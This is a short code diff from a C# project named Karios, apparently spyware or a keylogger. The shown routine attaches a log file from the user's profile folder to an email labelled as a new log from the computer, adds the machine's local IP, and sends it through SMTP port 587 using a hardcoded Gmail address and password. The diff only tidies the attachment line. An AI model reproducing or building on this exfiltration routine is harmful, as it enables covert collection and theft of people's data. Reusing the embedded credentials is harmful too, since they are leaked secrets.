@@ -258,8 +258,7 @@ namespace Karios
                                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " +
                             DateTime.Now.ToString("yyyy-MM-dd");
-                Attachment attachment;
-                attachment = new Attachment(pathToLog);
+                var attachment = new Attachment(pathToLog);
                 mail.Attachments.Add(attachment);
                 smtpServer.Port = 587;
                 smtpServer.Credentials = new NetworkCredential("GINGIRULES@gmail.com", "G1ng1RuleS");
